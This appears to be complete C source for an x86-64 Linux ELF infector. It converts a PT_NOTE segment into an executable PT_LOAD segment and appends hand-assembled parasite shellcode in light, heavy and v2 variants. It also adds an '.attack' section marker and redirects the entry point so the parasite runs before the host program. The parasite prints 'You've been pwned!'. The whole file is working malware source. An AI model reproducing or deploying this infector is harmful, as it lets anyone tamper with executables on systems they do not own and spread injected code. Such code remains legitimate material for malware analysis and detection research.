#define _POSIX_C_SOURCE 200809L
#include "parasite_blob.h"
#include <elf.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

struct parasite {
    const uint8_t *bytes;
    size_t         size;
    size_t         here_offset;
    size_t         here_va_quad_off;
    size_t         orig_entry_quad_off;
    const char    *name;
};

int infect_verbose = 0;

#define PARASITE_SIZE          0x5e
#define HERE_OFFSET            0x25
#define HERE_VA_QUAD_OFFSET    0x3b
#define ORIG_ENTRY_QUAD_OFFSET 0x43
#define MSG_OFFSET             0x4b

static const uint8_t parasite_template[PARASITE_SIZE] = {
    0x50,
    0x57,
    0x56,
    0x52,
    0x41, 0x53,

    0xb8, 0x01, 0x00, 0x00, 0x00,
    0xbf, 0x01, 0x00, 0x00, 0x00,
    0x48, 0x8d, 0x35, 0x34, 0x00, 0x00, 0x00,
    0xba, 0x13, 0x00, 0x00, 0x00,
    0x0f, 0x05,

    0x48, 0x8d, 0x0d, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x2b, 0x0d, 0x0f, 0x00, 0x00, 0x00,
    0x48, 0x03, 0x0d, 0x10, 0x00, 0x00, 0x00,

    0x41, 0x5b,
    0x5a,
    0x5e,
    0x5f,
    0x58,
    0xff, 0xe1,

    0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,

    'Y','o','u','\'','v','e',' ','b','e','e','n',' ','p','w','n','e','d','!','\n',
};

#define HEAVY_PARASITE_SIZE          0x83
#define HEAVY_HERE_OFFSET            0x1f
#define HEAVY_HERE_VA_QUAD_OFFSET    0x60
#define HEAVY_ORIG_ENTRY_QUAD_OFFSET 0x68
#define HEAVY_MSG_OFFSET             0x70

static const uint8_t heavy_parasite_template[HEAVY_PARASITE_SIZE] = {
    0x50, 0x57, 0x56, 0x52, 0x41, 0x53,

    0xb8, 0x39, 0x00, 0x00, 0x00,
    0x0f, 0x05,

    0x48, 0x85, 0xc0,
    0x75, 0x1d,

    0x41, 0x5b,
    0x5a, 0x5e, 0x5f, 0x58,
    0x48, 0x8d, 0x0d, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x2b, 0x0d, 0x3a, 0x00, 0x00, 0x00,
    0x48, 0x03, 0x0d, 0x3b, 0x00, 0x00, 0x00,
    0xff, 0xe1,

    0x50,
    0xb8, 0x01, 0x00, 0x00, 0x00,
    0xbf, 0x01, 0x00, 0x00, 0x00,
    0x48, 0x8d, 0x35, 0x2f, 0x00, 0x00, 0x00,
    0xba, 0x13, 0x00, 0x00, 0x00,
    0x0f, 0x05,
    0x5f,
    0x31, 0xf6,
    0x31, 0xd2,
    0x45, 0x31, 0xd2,
    0xb8, 0x3d, 0x00, 0x00, 0x00,
    0x0f, 0x05,
    0x31, 0xff,
    0xb8, 0x3c, 0x00, 0x00, 0x00,
    0x0f, 0x05,

    0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,
    'Y','o','u','\'','v','e',' ','b','e','e','n',' ','p','w','n','e','d','!','\n',
};

#define PAGE 0x1000UL

#define LOG(...) do { if (infect_verbose) fprintf(stderr, __VA_ARGS__); } while (0)

int infect(const char *path, const struct parasite *p) {
    struct stat lst;
    if (stat(path, &lst) < 0 || !S_ISREG(lst.st_mode)) return 1;

    int fd = open(path, O_RDWR);
    if (fd < 0) { if (infect_verbose) perror(path); return 1; }

    Elf64_Ehdr eh;
    if (pread(fd, &eh, sizeof eh, 0) != (ssize_t)sizeof eh) {
        if (infect_verbose) perror("pread ehdr");
        close(fd); return 1;
    }
    if (memcmp(eh.e_ident, ELFMAG, SELFMAG) != 0) {
        LOG("%s: not ELF\n", path); close(fd); return 1;
    }
    if (eh.e_ident[EI_CLASS] != ELFCLASS64 ||
        eh.e_ident[EI_DATA]  != ELFDATA2LSB ||
        eh.e_machine         != EM_X86_64) {
        LOG("%s: not little-endian ELF64 x86_64\n", path);
        close(fd); return 1;
    }
    if (eh.e_type != ET_EXEC && eh.e_type != ET_DYN) {
        LOG("%s: not ET_EXEC or ET_DYN (skipping)\n", path);
        close(fd); return 1;
    }

    if (eh.e_shoff != 0 && eh.e_shnum > 0 && eh.e_shstrndx < eh.e_shnum) {
        Elf64_Shdr str_probe;
        if (pread(fd, &str_probe, sizeof str_probe,
                  eh.e_shoff + (off_t)eh.e_shstrndx * (off_t)sizeof str_probe)
                == (ssize_t)sizeof str_probe && str_probe.sh_size <= 65536) {
            char *probe_strtab = malloc(str_probe.sh_size);
            if (probe_strtab) {
                if (pread(fd, probe_strtab, str_probe.sh_size, str_probe.sh_offset)
                        == (ssize_t)str_probe.sh_size) {
                    for (Elf64_Half i = 0; i < eh.e_shnum; i++) {
                        Elf64_Shdr s;
                        if (pread(fd, &s, sizeof s,
                                  eh.e_shoff + (off_t)i * (off_t)sizeof s)
                                != (ssize_t)sizeof s) continue;
                        if (s.sh_name < str_probe.sh_size &&
                            strcmp(probe_strtab + s.sh_name, ".attack") == 0) {
                            free(probe_strtab); close(fd); return 0;
                        }
                    }
                }
                free(probe_strtab);
            }
        }
    }

    {
        int has_interp = 0;
        Elf64_Phdr probe;
        for (int i = 0; i < eh.e_phnum; i++) {
            if (pread(fd, &probe, sizeof probe,
                      eh.e_phoff + (off_t)i * (off_t)sizeof probe)
                != (ssize_t)sizeof probe) break;
            if (probe.p_type == PT_INTERP) { has_interp = 1; break; }
        }
        if (eh.e_type == ET_DYN && !has_interp) {
            LOG("%s: shared library (no PT_INTERP), skipping\n", path);
            close(fd); return 1;
        }
    }

    Elf64_Phdr *ph = calloc(eh.e_phnum, sizeof *ph);
    if (pread(fd, ph, eh.e_phnum * sizeof *ph, eh.e_phoff)
            != (ssize_t)(eh.e_phnum * sizeof *ph)) {
        if (infect_verbose) perror("pread phdrs");
        free(ph); close(fd); return 1;
    }

    int note = -1;
    Elf64_Addr max_end = 0;
    for (int i = 0; i < eh.e_phnum; i++) {
        if (ph[i].p_type == PT_NOTE && note < 0) note = i;
        if (ph[i].p_type == PT_LOAD) {
            Elf64_Addr end = ph[i].p_vaddr + ph[i].p_memsz;
            if (end > max_end) max_end = end;
        }
    }
    if (note < 0) {
        LOG("%s: no PT_NOTE; cannot infect with this method\n", path);
        free(ph); close(fd); return 1;
    }

    struct stat st;
    if (fstat(fd, &st) < 0) { if (infect_verbose) perror("fstat"); free(ph); close(fd); return 1; }

    Elf64_Addr new_vaddr  = (max_end + PAGE - 1) & ~(PAGE - 1);
    off_t      new_offset = ((off_t)st.st_size + PAGE - 1) & ~(off_t)(PAGE - 1);

    if (new_offset > st.st_size) {
        if (ftruncate(fd, new_offset) < 0) {
            if (infect_verbose) perror("ftruncate");
            free(ph); close(fd); return 1;
        }
    }

    uint8_t blob[8192];
    if (p->size > sizeof blob) {
        LOG("internal: parasite too large (%zu > %zu)\n",
                p->size, sizeof blob);
        free(ph); close(fd); return 1;
    }
    memcpy(blob, p->bytes, p->size);

    Elf64_Addr here_va    = new_vaddr + p->here_offset;
    Elf64_Addr orig_entry = eh.e_entry;
    memcpy(blob + p->here_va_quad_off,    &here_va,    8);
    memcpy(blob + p->orig_entry_quad_off, &orig_entry, 8);

    if (pwrite(fd, blob, p->size, new_offset) != (ssize_t)p->size) {
        if (infect_verbose) perror("pwrite blob");
        free(ph); close(fd); return 1;
    }

    if (eh.e_shoff != 0 && eh.e_shnum > 0 && eh.e_shstrndx < eh.e_shnum) {
        Elf64_Shdr *shdrs = calloc(eh.e_shnum + 1, sizeof *shdrs);
        if (!shdrs) goto skip_shdr;
        if (pread(fd, shdrs, (size_t)eh.e_shnum * sizeof *shdrs, eh.e_shoff)
                != (ssize_t)((size_t)eh.e_shnum * sizeof *shdrs)) {
            free(shdrs); goto skip_shdr;
        }

        Elf64_Shdr str = shdrs[eh.e_shstrndx];
        char *strtab = malloc(str.sh_size + 32);
        if (!strtab) { free(shdrs); goto skip_shdr; }
        if (pread(fd, strtab, str.sh_size, str.sh_offset) != (ssize_t)str.sh_size) {
            free(strtab); free(shdrs); goto skip_shdr;
        }

        int already = 0;
        for (Elf64_Half i = 0; i < eh.e_shnum; i++) {
            if (shdrs[i].sh_name < str.sh_size &&
                strcmp(strtab + shdrs[i].sh_name, ".attack") == 0) {
                already = 1; break;
            }
        }
        if (already) { free(strtab); free(shdrs); goto skip_shdr; }

        static const char attack_name[] = ".attack";
        size_t name_off = str.sh_size;
        memcpy(strtab + name_off, attack_name, sizeof attack_name);
        size_t new_str_size = name_off + sizeof attack_name;

        struct stat st2;
        if (fstat(fd, &st2) < 0) { free(strtab); free(shdrs); goto skip_shdr; }
        off_t new_str_off = (off_t)st2.st_size;
        off_t new_sht_off = new_str_off + (off_t)new_str_size;
        new_sht_off = (new_sht_off + 7) & ~(off_t)7;

        if (pwrite(fd, strtab, new_str_size, new_str_off) != (ssize_t)new_str_size) {
            free(strtab); free(shdrs); goto skip_shdr;
        }

        shdrs[eh.e_shstrndx].sh_offset = new_str_off;
        shdrs[eh.e_shstrndx].sh_size   = new_str_size;

        Elf64_Shdr *poly = &shdrs[eh.e_shnum];
        poly->sh_name      = (uint32_t)name_off;
        poly->sh_type      = SHT_PROGBITS;
        poly->sh_flags     = SHF_ALLOC | SHF_EXECINSTR;
        poly->sh_addr      = new_vaddr;
        poly->sh_offset    = new_offset;
        poly->sh_size      = p->size;
        poly->sh_link      = 0;
        poly->sh_info      = 0;
        poly->sh_addralign = 16;
        poly->sh_entsize   = 0;

        size_t sht_size = (size_t)(eh.e_shnum + 1) * sizeof *shdrs;
        if (pwrite(fd, shdrs, sht_size, new_sht_off) != (ssize_t)sht_size) {
            free(strtab); free(shdrs); goto skip_shdr;
        }

        eh.e_shoff = (Elf64_Off)new_sht_off;
        eh.e_shnum = (Elf64_Half)(eh.e_shnum + 1);

        free(strtab);
        free(shdrs);
    }
skip_shdr:

    ph[note].p_type   = PT_LOAD;
    ph[note].p_flags  = PF_R | PF_X;
    ph[note].p_offset = new_offset;
    ph[note].p_vaddr  = new_vaddr;
    ph[note].p_paddr  = new_vaddr;
    ph[note].p_filesz = p->size;
    ph[note].p_memsz  = p->size;
    ph[note].p_align  = PAGE;

    if (pwrite(fd, ph, eh.e_phnum * sizeof *ph, eh.e_phoff)
            != (ssize_t)(eh.e_phnum * sizeof *ph)) {
        if (infect_verbose) perror("pwrite phdrs");
        free(ph); close(fd); return 1;
    }

    eh.e_entry = new_vaddr;
    if (pwrite(fd, &eh, sizeof eh, 0) != (ssize_t)sizeof eh) {
        if (infect_verbose) perror("pwrite ehdr");
        free(ph); close(fd); return 1;
    }

    LOG("infected %s with %s: orig entry 0x%lx -> parasite at 0x%lx (file off 0x%lx)\n",
        path, p->name, (unsigned long)orig_entry,
        (unsigned long)new_vaddr, (unsigned long)new_offset);

    free(ph);
    close(fd);
    return 0;
}

const struct parasite light_parasite = {
    .bytes               = parasite_template,
    .size                = PARASITE_SIZE,
    .here_offset         = HERE_OFFSET,
    .here_va_quad_off    = HERE_VA_QUAD_OFFSET,
    .orig_entry_quad_off = ORIG_ENTRY_QUAD_OFFSET,
    .name                = "light",
};

const struct parasite heavy_parasite = {
    .bytes               = heavy_parasite_template,
    .size                = HEAVY_PARASITE_SIZE,
    .here_offset         = HEAVY_HERE_OFFSET,
    .here_va_quad_off    = HEAVY_HERE_VA_QUAD_OFFSET,
    .orig_entry_quad_off = HEAVY_ORIG_ENTRY_QUAD_OFFSET,
    .name                = "heavy",
};

const struct parasite v2_parasite = {
    .bytes               = parasite_blob,
    .size                = PARASITE_BLOB_SIZE,
    .here_offset         = PARASITE_HERE_LABEL_OFFSET,
    .here_va_quad_off    = PARASITE_HERE_VA_QUAD_OFFSET,
    .orig_entry_quad_off = PARASITE_ORIG_ENTRY_QUAD_OFFSET,
    .name                = "v2",
};

int main(int argc, char **argv) {
    infect_verbose = 1;
    const struct parasite *p = &light_parasite;
    int first = 1;
    if (argc >= 2 && strcmp(argv[1], "--heavy") == 0) {
        p = &heavy_parasite;
        first = 2;
    } else if (argc >= 2 && strcmp(argv[1], "--light") == 0) {
        first = 2;
    } else if (argc >= 2 && strcmp(argv[1], "--v2") == 0) {
        p = &v2_parasite;
        first = 2;
    }
    if (argc <= first) {
        fprintf(stderr, "usage: %s [--light|--heavy|--v2] <elf>...\n", argv[0]);
        return 2;
    }
    int rc = 0;
    for (int i = first; i < argc; i++) {
        if (infect(argv[i], p) != 0) rc = 1;
    }
    return rc;
}